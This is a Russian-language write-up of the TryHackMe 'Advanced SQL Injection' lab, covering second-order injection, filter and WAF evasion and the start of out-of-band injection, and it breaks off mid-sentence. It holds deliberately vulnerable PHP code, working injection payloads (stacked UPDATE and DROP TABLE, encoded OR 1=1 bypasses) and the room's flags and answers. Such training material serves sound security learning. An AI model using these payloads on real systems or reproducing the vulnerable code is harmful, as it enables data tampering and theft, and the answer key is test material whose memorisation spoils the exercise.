[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Advanced SQL Injection](https://tryhackme.com/r/room/advancedsqlinjection) 

Всего 5 заданий:
## Задание 1
SQL-инъекция остается одной из самых серьезных и распространенных уязвимостей безопасности веб-приложений. Эта 
угроза возникает, когда злоумышленник использует способность веб-приложения выполнять произвольные SQL- запросы, что 
приводит к несанкционированному доступу к базе данных, эксфильтрации данных, манипулированию данными или даже 
полному контролю над приложением. В этой комнате мы разберемся с передовыми методами SQL -инъекции, что обеспечит 
всестороннее понимание сложных векторов атак и стратегий смягчения.

К концу этой комнаты вы будете иметь более глубокое понимание различных методов SQL-инъекций. Это даст вам навыки 
выявления и использования этих уязвимостей в различных сценариях и внедрения надежной защиты для защиты ваших 
приложений.

#### Цели обучения

В ходе изучения этой аудитории вы получите полное представление о следующих ключевых концепциях:
- SQL-инъекция второго порядка 
- Фильтр уклонения
- Внеполосная SQL- инъекция
- Методы автоматизации
- Меры по смягчению последствий

Предпосылки обучения

Перед началом занятий рекомендуется изучить следующие темы:

- SQL- инъекция
- SQLMAP
- Топ-10 OWASP
- Nmap
Подключение к машине

Вы можете запустить виртуальную машину, нажав Start Machine кнопку, прикрепленную к этой задаче. Вы можете получить 
доступ к виртуальной машине с помощью AttackBox или вашего VPN- подключения. Позже в комнате мы воспользуемся 
уязвимым приложением для практического выполнения упражнения и ознакомления с различными векторами атак. Пожалуйста, 
подождите 1-2 минуты после полной загрузки системы, чтобы позволить автоматическим скриптам успешно выполниться.

Прежде чем погрузиться в работу, крайне важно четко понимать версию базы данных и сведения об операционной системе 
целевой машины. Для этого мы можем использовать Nmap, мощный инструмент сканирования сети, для тщательного 
сканирования MACHINE_IP. Это сканирование предоставит ценную информацию об открытых портах, запущенных службах и 
операционной системе целевой машины. Тем, кто не знаком с Nmap, мы рекомендуем просмотреть нашу всеобъемлющую 
комнату Nmap, чтобы быстро освоить эффективное использование этого инструмента. Вот вывод Nmap после сканирования 
машины:


Терминал
```commandline
thm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP

Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST
Nmap scan report for MACHINE_IP
Host is up (0.00034s latency).

PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
3306/tcp open     mysql
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=SQLi
| Not valid before: 2024-05-23T04:08:44
|_Not valid after:  2024-11-22T04:08:44
|_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.
MAC Address: 02:87:BD:21:12:33 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds
```
Машина использует службу MySQL на Windows.

Начнем! 

### Ответьте на вопросы ниже
На каком порту работает служба MySQL?
```commandline
3306
```

## Задание 2
В последней комнате SQL -инъекции мы исследовали основы SQL -инъекции, понимая, как злоумышленники используют 
уязвимости в веб-приложениях для манипулирования SQL- запросами и доступа к несанкционированным данным. Мы 
рассмотрели основные методы, такие как SQL -инъекции на основе ошибок и объединений, а также методы слепой SQL 
-инъекции, такие как атаки на основе булевых значений и времени. Вот краткий обзор комнаты, охватывающей основные 
типы SQL -инъекций.

#### типы SQL-инъекций

Внутриполосная SQL- инъекция

Этот метод считается наиболее распространенным и простым типом атаки SQL -инъекцией. В этом методе злоумышленник 
использует один и тот же канал связи как для инъекции, так и для извлечения данных. Существует два основных типа 
**внутриполосной SQL- инъекции**:

- Error-Based SQL Injection : Злоумышленник манипулирует SQL- запросом, чтобы выдавать сообщения об ошибках из базы 
данных. Эти сообщения об ошибках часто содержат информацию о структуре базы данных, которую можно использовать для 
  дальнейшей эксплуатации базы данных. Пример: SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version)
  ). Если в сообщении об ошибке возвращается версия базы данных, это раскрывает информацию о базе данных.
- SQL - инъекция на основе объединения : злоумышленник использует SQL- оператор UNION для объединения результатов двух 
  или более операторов SELECT в один результат, тем самым извлекая данные из других таблиц. Пример: SELECT name, 
  email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin.

**Выводная (слепая) SQL- инъекция**

Inferential SQL injection не передает данные напрямую через веб-приложение, что делает его эксплуатацию более 
сложной. Вместо этого злоумышленник отправляет полезные данные и наблюдает за поведением приложения и временем 
отклика, чтобы сделать вывод о базе данных. Существует два основных типа inferential SQL injection:

- Слепая инъекция SQL на основе логических значений: злоумышленник отправляет SQL- запрос в базу данных, заставляя 
приложение возвращать другой результат в зависимости от истинного или ложного условия. Анализируя ответ приложения, 
  злоумышленник может сделать вывод о том, была ли полезная нагрузка истинной или ложной. Пример: SELECT * FROM 
  users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition).  
  Злоумышленник может сделать вывод о результате, если содержимое или поведение страницы изменятся в зависимости от 
  условия.
- Слепая инъекция SQL-кода с задержкой по времени: злоумышленник отправляет SQL- запрос в базу данных, что 
  задерживает ответ на указанное время, если условие истинно. Измеряя время ответа, злоумышленник может сделать 
  вывод, является ли условие истинным или ложным. Например, SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR 
  DELAY '00:00:05'--. Если ответ задерживается на 5 секунд, злоумышленник может сделать вывод, что условие было 
  истинным.

**Внеполосная SQL- инъекция**

Внеполосная инъекция SQL используется, когда злоумышленник не может использовать тот же канал для запуска атаки и 
сбора результатов или когда ответы сервера нестабильны. Этот метод основан на том, что сервер базы данных делает 
внеполосный запрос (например, HTTP или DNS) для отправки результата запроса злоумышленнику. HTTP обычно используется 
при внеполосной инъекции SQL для отправки результата запроса на  сервер злоумышленника.  Мы подробно обсудим это в 
этой комнате.

Каждый тип техники SQL -инъекции имеет свои преимущества и проблемы. Понимание этих техник имеет решающее значение 
для выявления и устранения уязвимостей SQL -инъекции в веб-приложениях. Внутриполосная SQL -инъекция легко 
эксплуатируется и обнаруживается, но она шумная и легко отслеживается. Выводная (слепая) SQL -инъекция сложнее в 
эксплуатации и требует множественных запросов, но может использоваться, когда подробные сообщения об ошибках 
недоступны. Внеполосная SQL- инъекция встречается реже и очень эффективна, требует внешнего управления сервером и 
полагается на способность базы данных делать внеполосные запросы. Освоив эти техники, тестировщики на проникновение 
могут эффективно выявлять и эксплуатировать уязвимости SQL -инъекции, помогая организациям защищать свои 
веб-приложения от этих критических угроз.

### Ответьте на вопросы ниже
Какой тип SQL-инъекции использует один и тот же канал связи для инъекции и извлечения данных?

```commandline
In-band
```
Какой протокол обычно используется для отправки результатов запроса на сервер злоумышленника при внеполосной SQL-инъекции?
```commandline
HTTP
```

## Задание 3
SQL -инъекция второго порядка, также известная как хранимая SQL -инъекция, использует уязвимости, при которых 
вводимые пользователем данные сохраняются и впоследствии используются в другой части приложения, возможно, после 
некоторой начальной обработки. Этот тип атаки более коварен, поскольку вредоносный SQL-код не обязательно должен 
немедленно приводить к ошибке синтаксиса SQL или другим очевидным проблемам, что затрудняет его обнаружение с 
помощью стандартных методов проверки ввода. Инъекция происходит при втором использовании данных, когда они 
извлекаются и используются в команде SQL, отсюда и название «Второй порядок».

диаграмма рабочего процесса SQL-инъекции второго порядка

Влияние

Опасность SQL-инъекции второго порядка заключается в ее способности обходить типичные фронтальные защиты, такие как 
базовая проверка или очистка ввода, которые происходят только в точке начального ввода данных. Поскольку полезная 
нагрузка не вызывает сбоев на первом этапе, ее можно не заметить, пока не станет слишком поздно, что делает атаку 
особенно скрытной.

Пример
Мы будем использовать приложение для обзора книг. Приложение позволяет пользователям добавлять новые книги через 
веб-страницу (add.php). Пользователям предлагается предоставить сведения о книге, которую они хотят добавить в базу 
данных. Вы можете получить доступ к приложению по адресу http://MACHINE_IP/second/add.php. Собранные данные включают 
SSN, book_name, и author. Давайте рассмотрим добавление книги со следующими данными: SSN: UI00012, Название книги: 
Введение в PHP, Автор: Тим. Эта информация вводится через форму на add.php странице и после отправки сохраняется в 
базе данных BookStore, как показано ниже:

добавление новой книги в базу данных

Как мы знаем, SQL- инъекции второго порядка особенно сложно обнаружить. В отличие от традиционных SQL- инъекций, 
которые используют уязвимости обработки в реальном времени, они происходят, когда данные, ранее сохраненные в базе 
данных, позже используются в SQL- запросе. Обнаружение этой уязвимости часто требует понимания того, как данные 
проходят через приложение и используются повторно, что требует глубоких знаний внутренних операций.

Анализ Кодекса

Рассмотрим фрагмент PHP- кода, используемый в нашем приложении для добавления книг:

```commandline
if (isset($_POST['submit'])) {

    $ssn = $conn->real_escape_string($_POST['ssn']);

    $book_name = $conn->real_escape_string($_POST['book_name']);

    $author = $conn->real_escape_string($_POST['author']);

    $sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";

    if ($conn->query($sql) === TRUE) {

        echo "<p class='text-green-500'>New book added successfully</p>";

    } else {

        echo "<p class='text-red-500'>Error: " . $conn->error . "</p>";

    }

}
```
Код использует real_escape_string()метод для экранирования специальных символов во входных данных. Хотя этот метод 
может снизить некоторые риски немедленной инъекции SQL путем экранирования одинарных кавычек и других метасимволов 
SQL , он не защищает приложение от SQLi второго порядка. Ключевой проблемой здесь является отсутствие 
параметризованных запросов, что необходимо для предотвращения атак с использованием инъекции SQL . Когда данные 
вставляются с использованием real_escape_string()метода, они могут включать символы полезной нагрузки, которые не 
наносят немедленного вреда, но могут быть активированы при последующем извлечении и использовании в другом запросе 
SQL . Например, вставка книги с таким названием Intro to PHP'; DROP TABLE books;--может не повлиять на операцию 
INSERT , но может иметь серьезные последствия, если имя книги впоследствии будет использовано в другом контексте SQL 
без надлежащей обработки.

Давайте попробуем добавить еще одну книгу с SSN test'.

общее количество книг в базе данных

Итак, SSN test'успешно вставлен в базу данных. Приложение включает функцию обновления сведений о книге через 
интерфейс, такой как update.php. Этот интерфейс может отображать существующие сведения о книге в полях редактируемой 
формы, извлеченных на основе ранее сохраненных данных, а затем обновлять их на основе ввода пользователя. Пентестер 
будет исследовать, использует ли приложение повторно данные (например, book_name), которые были ранее сохранены и 
потенциально испорчены. Затем он будет строить SQL- запросы для обновления записей, используя эти потенциально 
испорченные данные без надлежащей очистки или параметризации. Манипулируя функцией обновления, тестер может увидеть, 
выполняется ли вредоносная полезная нагрузка, добавленная на этапе вставки, во время операции обновления. Если 
приложение не применяет надлежащие методы безопасности на этом этапе, ранее внедренная полезная нагрузка '; DROP 
TABLE books; -- может быть активирована, что приведет к выполнению вредоносной команды SQL, такой как удаление 
таблицы. Вы можете посетить страницу, http://MACHINE_IP/second/update.phpчтобы обновить любые сведения о книге.

обновить панель управления содержимым книги

Теперь давайте рассмотрим update.php код. Скрипт PHP позволяет пользователям обновлять сведения о книгах в базе 
данных BookStore . С помощью структуры запроса мы проанализируем типичный сценарий, в котором тестер на 
проникновение может искать уязвимости SQL- инъекции, уделяя особое внимание тому, как обрабатываются и используются 
пользовательские данные в SQL- запросах.

```commandline
if ( isset($_POST['update'])) {
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];

    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
..
...
```
Скрипт начинается с проверки того, является ли метод запроса POST и была ли нажата кнопка обновления, что указывает 
на то, что пользователь намерен обновить данные книги. После этого скрипт извлекает вводимые пользователем данные 
непосредственно из данных POST:

```commandline
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];
```
Эти переменные ( ssn, new_book_name, new_author) затем используются для построения SQL-запроса для обновления данных указанной книги в базе данных:

```commandline
$update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
```
Скрипт использует multi_query для выполнения нескольких запросов. Он также вставляет логи в таблицу журналов для 
аналитических целей.

Подготовка полезной нагрузки

Мы знаем, что можем добавлять или изменять данные книги на основе их ssn. Обычный запрос на обновление книги может 
выглядеть так: 
```commandline
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
```
Однако команда SQL может быть изменена, если злоумышленник вставит специально созданное ssnзначение. Например, если 
злоумышленник использует ssn значение:
```commandline
12345'; UPDATE books SET book_name = 'Hacked'; --
```
Когда это значение используется в запросе на обновление, оно фактически завершает начальную команду обновления после 
12345и начинает новую команду. Это изменит book_name всех записей в таблице books на Hacked.

Давайте сделаем это

Начальная вставка полезной нагрузки : добавляется новая книга с полезной нагрузкой, 12345'; UPDATE books SET 
book_name = 'Hacked'; --вставленной как ssn. Точка с запятой ( ;) будет использоваться для завершения текущего 
оператора SQL.
общее количество книг в базе данных с полезной нагрузкой инъекции

Вредоносное выполнение SQL : После этого, когда администратор или любой другой пользователь посещает URL  
http://MACHINE_IP/second/update.php и обновляет книгу, вставленная полезная нагрузка вырывается из предполагаемой 
структуры команды SQL и внедряет новую команду, которая обновляет все записи в таблице книг. Давайте посетим 
страницу   http://MACHINE_IP/second/update.php page, обновим имя книги на что угодно и нажмем  кнопку Обновить . Код 
выполнит следующий оператор в бэкэнде.

UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');
Комментирование остального : Двойной тире ( --) — это символ комментария SQL . Все, что следует далее, --будет проигнорировано сервером SQL , что фактически нейтрализует любые оставшиеся части исходного оператора SQL , которые могут вызвать ошибки или раскрыть атаку. После выполнения указанного выше запроса он изменит название всех книг на hacked , как показано ниже:
состояние базы данных после выполнения полезной нагрузки

В этой задаче мы исследовали концепцию SQL- инъекции второго порядка через уязвимое веб-приложение для обзора книг. 
Для тестировщика на проникновение крайне важно изучить, как хранятся и впоследствии используются в SQL- запросах 
данные пользователя. Это включает в себя проверку того, что все формы обработки данных защищены от таких уязвимостей,
подчеркивая важность тщательного тестирования и знания методов безопасности для защиты от угроз инъекций.

### Ответьте на вопросы ниже
Каково значение флага после обновления названия всех книг на «скомпрометировано»?
```commandline
THM{SO_HACKED}
```
Каково значение флага после удаления таблицы hello из базы данных?
```commandline
THM{Table_Dropped}
```

## Задание 4
В сложных атаках с использованием SQL -инъекций обход фильтров имеет решающее значение для успешного использования 
уязвимостей. Современные веб-приложения часто реализуют защитные меры для дезинфекции или блокировки 
распространенных шаблонов атак, делая простые попытки SQL -инъекции неэффективными. Как пентестеры, мы должны 
адаптироваться, используя более сложные методы для обхода этих фильтров. В этом разделе будут рассмотрены такие 
методы, включая кодировку символов , SQL- инъекцию без кавычек и обработку сценариев, в которых нельзя использовать 
пробелы . Мы можем эффективно проникать в веб-приложения со строгой проверкой ввода и контролем безопасности, 
понимая и применяя эти методы . список ключевых слов для обхода фильтра

Кодирование символов
Кодирование символов подразумевает преобразование специальных символов в полезной нагрузке SQL- инъекции в 
закодированные формы, которые могут обходить входные фильтры.

URL-кодирование : URL-кодирование — это распространенный метод, при котором символы представляются с помощью знака процента (%), за которым следует их значение ASCII в шестнадцатеричном формате. Например, полезная нагрузка ' OR 1=1--может быть закодирована как %27%20OR%201%3D1--. Такое кодирование может помочь входным данным пройти через фильтры веб-приложений и быть декодированным базой данных, которая может не распознать их как вредоносные во время первоначальной обработки.
Шестнадцатеричное кодирование : Шестнадцатеричное кодирование — еще один эффективный метод построения SQL- запросов с использованием шестнадцатеричных значений. Например, запрос SELECT * FROM users WHERE name = 'admin'может быть закодирован как SELECT * FROM users WHERE name = 0x61646d696e. Представляя символы в виде шестнадцатеричных чисел, злоумышленник может обойти фильтры, которые не декодируют эти значения перед обработкой входных данных.
Unicode Encoding: Кодировка Unicode представляет символы с использованием escape-последовательностей Unicode. Например, строка adminможет быть закодирована как \u0061\u0064\u006d\u0069\u006e. Этот метод может обойти фильтры, которые проверяют только определенные символы ASCII, так как база данных будет правильно обрабатывать закодированный ввод.
Пример

В этом примере мы рассмотрим, как разработчики могут реализовать базовую фильтрацию для предотвращения атак SQL- 
инъекций, удаляя определенные ключевые слова и символы из пользовательского ввода. Однако мы также увидим, как 
злоумышленники могут обойти эту защиту, используя методы кодирования символов, такие как URL-кодирование.

Примечание : В следующих упражнениях мы будем использовать базы данных, отличные от предыдущих. Вы можете перейти на 
страницу по адресу http://MACHINE_IP/encoding/.

Вот PHP- код (search_books.php), который управляет функцией поиска:

```commandline
$book_name = $_GET['book_name'] ?? '';
$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
$sql = "SELECT * FROM books WHERE book_name = '$book_name'";
echo "<p>Generated SQL Query: $sql</p>";
$result = $conn->query($sql) or die("Error: " . $conn->error . " (Error Code: " . $conn->errno . ")");
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
...
..
```
Вот код Javascript на странице index.html, который предоставляет пользовательский интерфейс для поиска книг:

```commandline
function searchBooks() {
const bookName = document.getElementById('book_name').value;
const xhr = new XMLHttpRequest();
xhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);
   xhr.onload = function() {
       if (this.status === 200) {
           document.getElementById('results').innerHTML = this.responseText;
```
В приведенном выше примере разработчик реализовал базовый защитный механизм для предотвращения атак SQL -инъекций, удалив определенные ключевые слова SQL , такие как OR, AND, UNION, и SELECT. Фильтрация использует  str_replaceфункцию, которая удаляет эти ключевые слова из пользовательского ввода до того, как они будут включены в SQL- запрос. Этот подход фильтрации направлен на то, чтобы затруднить злоумышленникам внедрение вредоносных команд SQL , поскольку эти ключевые слова необходимы для многих полезных нагрузок SQL -инъекций.

Подготовка полезной нагрузки

Давайте рассмотрим процесс подготовки полезной нагрузки SQL -инъекции шаг за шагом, показывая, как кодирование URL может обойти базовые защиты. Сначала посмотрим, что происходит с обычным вводом, содержащим специальные символы или ключевые слова SQL . Когда мы ищем книгу с именем  Intro to PHP, мы получаем успешный результат, как показано ниже:

поиск книги панель инструментов

Но что, если мы попробуем разбить запрос, добавив специальные символы, такие как ', ;, и т. д. Мы получим следующий вывод:

ошибка при поиске книги

SQL-запрос выполняется некорректно, что, вероятно, означает вероятность SQL-инъекции. Давайте попробуем внедрить полезную нагрузку " Intro to PHP' OR 1=1". Мы получим следующий вывод:

результат ошибки с инъекцией полезной нагрузки

Итак, что здесь происходит? Когда этот ввод передается в PHP- скрипт, str_replaceфункция удаляет ключевое слово OR и одинарную кавычку, что приводит к очищенному вводу, который не выполнит предполагаемую инъекцию SQL . Этот ввод неэффективен, поскольку фильтрация удаляет критические компоненты, необходимые для успешной инъекции SQL .

Чтобы обойти фильтрацию, нам нужно закодировать входные данные с помощью URL-кодирования, которое представляет 
специальные символы и ключевые слова таким образом, что фильтр не распознает и не удаляет их. Вот пример полезной 
нагрузки  `1%27%20||%201=1%20--+`.  

%27— это кодировка URL для одинарной кавычки (').
%20— это кодировка URL для пробела ( ).
||представляет собой оператор SQL OR.
%3D— это URL-кодировка знака равенства (=).
%2D%2D— это кодировка URL для --, которая начинает комментарий в SQL .
В приведенной выше полезной нагрузке  1'закрывает текущую строку или значение в запросе SQL . Например, если запрос ищет название книги, которое соответствует 1, добавление 'закрывает строку, делая остальную часть ввода частью оператора SQL . || 1=1 часть использует оператор SQL OR для добавления условия, которое всегда истинно. Это условие гарантирует, что запрос вернет значение true для всех записей, обходя исходное условие, которое должно было ограничивать результаты. Аналогично, -- начинает комментарий в SQL , заставляя базу данных игнорировать остальную часть запроса. Это полезно для завершения любой оставшейся части запроса, которая может вызвать синтаксические ошибки или нежелательные условия. Чтобы обеспечить надлежащий интервал,  + добавьте пробел после комментария, гарантируя, что комментарий правильно завершен и нет проблем с синтаксисом.

Из консоли мы видим, что нажатие кнопки поиска приводит к вызову AJAX search_book.php.

вкладка «Сеть» в консоли

Нажмите, чтобы увеличить изображение.

Давайте используем полезную нагрузку непосредственно на странице PHP, чтобы избежать ненужной настройки/проверки со стороны клиента. Давайте посетим URL  http://MACHINE_IP/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1  со стандартной полезной нагрузкой Intro to PHP' OR 1=1, и вы увидите ошибку.

Тестирование инъекции при вызове API

Теперь URL-кодируйте полезную нагрузку Intro to PHP' || 1=1 --+с помощью Cyber Chef  и попробуйте получить доступ к 
URL-адресу с обновленной полезной нагрузкой. Мы получим следующий вывод, содержащий полную информацию:

инъекция с правильной полезной нагрузкой

Полезная нагрузка работает, поскольку кодирование URL представляет специальные символы и ключевые слова SQL таким 
образом, что обходит механизм фильтрации. Когда сервер декодирует входные данные, закодированные в URL, он 
восстанавливает специальные символы и ключевые слова, позволяя успешно выполнить инъекцию SQL. Используя кодирование 
URL, злоумышленники могут создавать полезные нагрузки, которые обходят базовые механизмы фильтрации ввода, 
предназначенные для блокировки инъекции SQL. Это демонстрирует важность использования более надежных защит, таких 
как параметризованные запросы и подготовленные операторы, которые могут предотвратить атаки с использованием 
инъекции SQL независимо от кодировки ввода.

### Ответьте на вопросы ниже
Какой код ошибки MySQL возникает при вводе недопустимого запроса с недопустимыми символами?
```commandline
1064
```
Как называется книга, у которой идентификатор книги = 6 ?
```commandline
Animal Series
```

## Задание 5
SQL - инъекция без кавычек

Методы SQL- инъекции без кавычек используются, когда приложение фильтрует одинарные или двойные кавычки или 
экранированные символы.

Использование числовых значений : один из подходов заключается в использовании числовых значений или других типов данных, не требующих кавычек. Например, вместо внедрения ' OR '1'='1злоумышленник может использовать OR 1=1в контексте, где кавычки не нужны. Этот метод может обойти фильтры, которые специально ищут escape или удаляют кавычки, позволяя внедрению продолжиться.
Использование комментариев SQL : Другой метод подразумевает использование комментариев SQL для завершения остальной части запроса. Например, ввод admin'--может быть преобразован в admin--, где --означает начало комментария в SQL , фактически игнорируя оставшуюся часть оператора SQL . Это может помочь обойти фильтры и предотвратить синтаксические ошибки.
Использование функции CONCAT() : Злоумышленники могут использовать функции SQLCONCAT() , например , для создания строк без кавычек. Например, CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)создает строку admin. CONCAT()Функция и подобные методы позволяют злоумышленникам создавать строки без непосредственного использования кавычек, что затрудняет обнаружение и блокировку полезной нагрузки фильтрами.
Пробелы не допускаются

Если пробелы не допускаются или отфильтровываются, можно использовать различные методы для обхода этого ограничения.

Комментарии для замены пробелов : одним из распространенных методов является использование комментариев SQL ( /**/) для замены пробелов. Например, вместо SELECT * FROM users WHERE name = 'admin', злоумышленник может использовать SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'. Комментарии SQL могут заменять пробелы в запросе, позволяя полезной нагрузке обходить фильтры, которые удаляют или блокируют пробелы.
Символы табуляции или новой строки : Другой подход заключается в использовании символов табуляции ( \t) или новой строки ( \n) в качестве заменителей пробелов. Некоторые фильтры могут разрешать эти символы, позволяя злоумышленнику построить запрос типа SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'. Этот метод может обойти фильтры, которые специально ищут пробелы.
Альтернативные символы : Один из эффективных методов заключается в использовании альтернативных URL-кодированных символов, представляющих различные типы пробелов, такие как %09(горизонтальная табуляция), %0A (перевод строки), %0C (перевод страницы), %0D(возврат каретки) и %A0(неразрывный пробел). Эти символы могут заменять пробелы в полезной нагрузке. 
Практический пример

В этом сценарии у нас есть конечная точка, http://MACHINE_IP/space/search_users.php?username=?которая возвращает данные пользователя на основе предоставленного имени пользователя. Разработчик внедрил фильтры для блокировки распространенных ключевых слов SQL -инъекции, таких как OR, AND и пробелы (%20), для защиты от атак SQL -инъекции.

Вот PHP- фильтрация, добавленная разработчиком.

$special_chars = array(" ", "AND", "and" ,"or", "OR" , "UNION", "SELECT");
$username = str_replace($special_chars, '', $username);
$sql = "SELECT * FROM user WHERE username = '$username'";
Если мы используем нашу стандартную полезную нагрузку 1%27%20||%201=1%20--+на конечной точке, то увидим, что даже с помощью кодирования URL она не работает.

инъекция с неправильной полезной нагрузкой

Запрос SQL показывает, что пробелы пропускаются кодом.  Чтобы обойти эти защиты, мы можем использовать URL-кодированные символы, которые представляют различные типы пробелов или переносов строк, такие как %09(горизонтальная табуляция), %0A(перевод строки). Эти символы могут заменять пробелы и по-прежнему правильно интерпретироваться анализатором SQL .

Исходную полезную нагрузку 1' OR 1=1 --можно изменить, чтобы использовать символы новой строки вместо пробелов, что приведет к полезной нагрузке 1'%0A||%0A1=1%0A--%27+. Эта полезная нагрузка создает то же логическое условие, что и , 1' OR 1=1 --но использует символы новой строки для обхода фильтра пробелов.

Синтаксический анализатор SQL интерпретирует символы новой строки как пробелы, преобразуя полезную нагрузку в 1' OR 1=1 --. Таким образом, запрос будет интерпретироваться из  SELECT * FROM users WHERE username = '$username'в  SELECT * FROM users WHERE username = '1' OR 1=1 --.

Теперь, если мы получим доступ к конечной точке через обновленную полезную нагрузку, мы сможем просмотреть все детали. 

инъекция с правильной полезной нагрузкой

Подводя итог, важно понимать, что ни один метод не гарантирует обход при работе с фильтрами или брандмауэрами веб-приложений (WAF), разработанными для предотвращения атак с использованием SQL- инъекций .  Однако вот несколько советов и приемов, которые можно использовать для обхода этих защит. В этой таблице представлены различные методы, которые можно использовать для обхода фильтров и WAF:


Сценарий	Описание	Пример
Ключевые слова типа SELECT запрещены
Ключевые слова SQL часто можно обойти, изменив их регистр или добавив встроенные комментарии, чтобы разбить их
ВЫБЕРИТЕ * ОТ ПОЛЬЗОВАТЕЛЕЙ или SE/**/LECT * ОТ/**/пользователей
Пространства запрещены
Использование альтернативных пробельных символов или комментариев для замены пробелов может помочь обойти фильтры.
`SELECT%0A*%0AFROM%0Ausers или SELECT/**/*/**/FROM/**/users`
Логические операторы, такие как И, ИЛИ, запрещены.
Использование альтернативных логических операторов или конкатенации для обхода фильтров ключевых слов.
имя пользователя = 'admin' && пароль = 'password' или имя пользователя = 'admin'/**/||/**/1=1 --
Распространенные ключевые слова, такие как UNION, SELECT, запрещены.
Использование эквивалентных представлений, таких как шестнадцатеричная или кодировка Unicode, для обхода фильтров.
ВЫБРАТЬ * ИЗ пользователей, ГДЕ имя пользователя = CHAR(0x61,0x64,0x6D,0x69,0x6E)
Определенные ключевые слова, такие как OR, AND, SELECT, UNION, запрещены.
Использование методов обфускации для маскировки ключевых слов SQL путем объединения символов со строковыми функциями или комментариями.
SELECT * FROM users WHERE username = CONCAT('a','d','m','i','n') или SELECT/**/username/**/FROM/**/users

В реальных средах запросы, которые вы применяете, и видимость отфильтрованных ключевых слов напрямую невозможны. Как 
пентестеру, важно понимать, что тестирование SQL -инъекций часто включает в себя подход «удар-и-проба», требующий 
терпения и настойчивости. Каждая среда может иметь уникальные фильтры и средства защиты, что делает необходимым 
адаптироваться и пробовать разные методы, чтобы найти успешный вектор инъекции.

### Ответьте на вопросы ниже
Какой пароль у пользователя «attacker»?
```commandline
tesla
```

Что из перечисленного можно использовать, если ключевое слово SELECT запрещено? Напишите только правильный вариант.
a) SElect

б) Выбрать

c) Оба варианта a и b

г) Мы не можем обойти фильтр ключевых слов SELECT
```commandline
c
```

## Задание 6
Внеполосная (OOB) SQL- инъекция — это метод атаки, который пентестер/редтимеры используют для извлечения данных или 
выполнения вредоносных действий, когда прямые или традиционные методы неэффективны. В отличие от внутриполосной SQL 
-инъекции, где злоумышленник использует один и тот же канал для атаки и извлечения данных, внеполосная SQL -инъекция 
использует отдельные каналы для отправки полезной нагрузки и получения ответа. Внеполосные методы используют такие 
функции, как HTTP- запросы, DNS- запросы, протокол SMB или другие сетевые протоколы, к которым может иметь доступ 
сервер базы данных, что позволяет злоумышленникам обходить брандмауэры, системы обнаружения вторжений и другие меры 
безопасности.

Технологический процесс закачки OOB

Одним из ключевых преимуществ SQL- инъекции по внеполосному каналу является ее скрытность и надежность. Используя 
различные каналы связи , злоумышленники могут минимизировать риск обнаружения и поддерживать постоянное соединение с 
скомпрометированной системой. Например, злоумышленник может внедрить полезную нагрузку SQL, которая заставит сервер 
базы данных сделать DNS- запрос к вредоносному домену, контролируемому злоумышленником. Затем ответ может быть 
использован для извлечения конфиденциальных данных без оповещения механизмов безопасности, которые отслеживают 
прямые взаимодействия с базой данных. Этот метод позволяет злоумышленникам эксплуатировать уязвимости даже в сложных 
сетевых средах, где прямое соединение между злоумышленником и целью ограничено или тщательно контролируется.

Зачем использовать OOB

В сценариях, где прямые ответы дезинфицируются или ограничиваются мерами безопасности, каналы OOB позволяют 
злоумышленникам извлекать данные без немедленной обратной связи с сервером. Например, механизмы безопасности, такие 
как хранимые процедуры , кодирование вывода и ограничения на уровне приложения , могут предотвратить прямые ответы , 
делая традиционные атаки с использованием SQL-инъекций неэффективными. Внеполосные методы, такие как использование 
DNS или HTTP- запросов, позволяют отправлять данные на внешний сервер, контролируемый злоумышленником, обходя эти 
ограничения.

Кроме того, системы обнаружения вторжений ( IDS ) и межсетевые экраны веб-приложений (WAF) часто отслеживают и 
регистрируют ответы SQL- запросов на предмет подозрительной активности , блокируя прямые ответы от потенциально 
вредоносных запросов. Используя каналы OOB, злоумышленники могут избежать обнаружения, используя менее тщательно 
контролируемые сетевые протоколы, такие как DNS или SMB, для передачи данных. Это особенно полезно в сетевых средах 
с ограниченным прямым подключением между злоумышленником и сервером базы данных, например, когда сервер находится за 
